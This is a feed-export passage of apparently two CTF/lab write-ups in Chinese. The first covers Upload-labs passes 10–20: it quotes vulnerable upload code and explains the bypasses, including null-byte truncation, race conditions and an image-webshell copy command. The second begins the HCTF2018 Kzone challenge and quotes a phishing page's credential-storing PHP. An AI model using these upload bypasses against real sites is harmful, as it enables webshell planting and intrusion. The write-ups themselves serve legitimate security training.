class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">        $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;        </span><br><span class="line">        if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;上传出错！&apos;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>漏洞语句： <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code><br>双写绕过即可<br><img src="/Upload-labs Writeup.resources/3F682A28-3A84-4744-BBE8-504147E09E9C.png" alt="35fecadb9b862e8bb04ac0447c082b0f"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到$img_path<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure></p><p>利用%00截断让save_path直接等于filename，让filename可控，同时上传成php<br><img src="/Upload-labs Writeup.resources/44B855D3-2845-4167-8508-17D33D53431D.png" alt="44f79a21ea74803a9c9155da23c19189"></p><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>和11关一样，只是save_path通过post传入<br>修改成00即可<br><img src="/Upload-labs Writeup.resources/E22F1525-D6BF-4498-AE4A-B0E535E9B824.png" alt="86fb2db9805861298a92016e23c85f66"></p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>任务变了2333<br><img src="/Upload-labs Writeup.resources/D435DE6C-699F-44C1-A4C5-FA68006AEC02.png" alt="54be3625732285608ecd6d42e428d13d"></p><p>只要求传图片马，稳</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> pic.jpg /b + phpinfo.php /a webshell.jpg</span><br></pre></td></tr></table></figure><p><img src="/Upload-labs Writeup.resources/CF64E4F8-93A7-4D5D-8391-C7B3858B27D9.png" alt="99ccdadb4aa35a24336c3e53b8738096"></p><p>直接上传就行<br><img src="/Upload-labs Writeup.resources/902C1B10-CA49-4499-A121-746C1958C612.png" alt="fa6ee110b46ba4288567e8bf7c4a1174"></p><p>隐藏了恶意代码</p><p>看一下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>只需要知道他的意思就是检查了文件头部，然后确定文件类型</p><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>这关没什么好讲的，直接图片马就可以绕<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>它主要就是调用了一个getimagesize()函数，</p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>同样利用图片马就行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用exif_imagetype()检测图片类型</p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p><a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a><br>写的超级详细了，可以存一份pdf</p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>这道题是典型的条件竞争<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到代码判断是先进行上传文件，然后再进行判断后缀，这样就存在一个典型的条件竞争</p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>同样是条件竞争漏洞<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"./myupload.php"</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'size'</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">'文件已经被上传，但没有重命名。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">'这个文件不能上传到服务器的临时文件存储目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传目录不可写。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，无法上传该类型文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传的文件过大。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，服务器已经存在相同名称文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">'文件无法上传，文件不能复制到目标目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">'未知错误！'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        $file_name = trim($_POST['save_name']);</span></span><br><span class="line"><span class="comment">        $file_name = deldot($file_name);//删除文件名末尾的点</span></span><br><span class="line"><span class="comment">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span></span><br><span class="line"><span class="comment">        $file_ext = strtolower($file_ext); //转换为小写</span></span><br><span class="line"><span class="comment">        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA</span></span><br><span class="line"><span class="comment">        $file_ext = trim($file_ext); //首尾去空</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用apache解析0x00来进行绕过<br>或者利用<code>move_uploaded_file</code> 不解析末尾的<code>\.</code>来绕过</p><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">           <span class="comment">//mime check</span></span><br><span class="line">           $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">           <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">               $msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="comment">//check filename</span></span><br><span class="line">               $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">               <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">                   $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               $ext = end($file);</span><br><span class="line">               $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">               <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">                   $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                   $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">                   $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">                   $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">                   <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                       $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                       $is_upload = <span class="keyword">true</span>;</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       $msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>这道题也是ctf中常见的题型了，一共就两个点，一个是数组判断<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">                    $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure></p><p>另外一个就是利用数组去绕过后缀检测同时保留文件名<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure></p><p>比较简单，就不细说了<br><img src="/Upload-labs Writeup.resources/D4820A43-DC08-4BD9-B7F2-638640FE0090.png" alt="1a07c38f6c36f7b2ba26853060815570"><br>只有一个注意点就是用\去吃掉后面的.然后经过<code>move_uploaded_file()</code>除掉后面的.<br>成功上传</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-01-05 11:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/[33923]浴衣と金魚-64535234.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="文件上传" scheme="http://patrilic.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018 Kzone Write-up</title>
    <link href="http://patrilic.top/2019/04/03/HCTF2018%20Kzone%20Write-up/"/>
    <id>http://patrilic.top/2019/04/03/HCTF2018 Kzone Write-up/</id>
    <published>2019-04-03T15:20:33.000Z</published>
    <updated>2019-08-12T14:31:34.099Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Analyse"><a href="#0x01-Analyse" class="headerlink" title="0x01 Analyse"></a>0x01 Analyse</h2><p><img src="/HCTF2018 Kzone Write-up.resources/179D0238-D236-4116-9D28-78FE46E6DB7A.png" alt="3d60020e7fe085411c676e26b845a90c"></p><p><code>www.zip</code>内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">├── 2018.php</span><br><span class="line">├── Default account&amp;password.txt</span><br><span class="line">├── Tutorial.txt</span><br><span class="line">├── admin</span><br><span class="line">│   ├── delete.php</span><br><span class="line">│   ├── index.php</span><br><span class="line">│   ├── list.php</span><br><span class="line">│   ├── login.php</span><br><span class="line">│   └── pass.php</span><br><span class="line">├── config.php</span><br><span class="line">├── include</span><br><span class="line">│   ├── common.php</span><br><span class="line">│   ├── db.class.php</span><br><span class="line">│   ├── function.php</span><br><span class="line">│   ├── kill.intercept.php</span><br><span class="line">│   ├── member.php</span><br><span class="line">│   ├── os.php</span><br><span class="line">│   └── safe.php</span><br><span class="line">├── index.php</span><br><span class="line">├── install.sql</span><br><span class="line">└── robots.txt</span><br></pre></td></tr></table></figure><p>看2018.php里<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'./include/common.php'</span>;</span><br><span class="line">$realip = real_ip();</span><br><span class="line">$ipcount = $DB-&gt;count(<span class="string">"SELECT count(*) from fish_user where ip='$realip'"</span>);</span><br><span class="line"><span class="keyword">if</span> ($ipcount &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    $username = addslashes($_POST[<span class="string">'user'</span>]);</span><br><span class="line">    $password = addslashes($_POST[<span class="string">'pass'</span>]);</span><br><span class="line">    $address = getCity($realip);</span><br><span class="line">    $time = date(<span class="string">"Y-m-d H:i:s"</span>);</span><br><span class="line">    $ua = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">    $device = get_device($ua);</span><br><span class="line">    $sql = <span class="string">"INSERT INTO `fish_user`(`username`, `password`, `ip`, `address`, `time`, `device`) VALUES ('&#123;$username&#125;','&#123;$password&#125;','&#123;$realip&#125;','&#123;$address&#125;','&#123;$time&#125;','&#123;$device&#125;')"</span>;</span><br><span class="line">    $DB-&gt;query($sql);</span><br><span class="line">    header(<span class="string">"Location: https://i.qq.com/?rd="</span> . $username);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">"Location: https://i.qq.com/?rd="</span> . $username);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>大概是钓鱼网站常规套路了，就是把用户信息扔进数据库</p><p>一个一个点看，发现<code>Common.php</code>里把<code>safe.php</code>都包含了<br><img src="/HCTF2018 Kzone Write-up.resources/1C377BA7-A672-49AE-8BBC-7287120DB5AD.png" alt="78ee2543b505755fe447a5beb9bdc1e3"></p><p>然后来看<code>safe.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 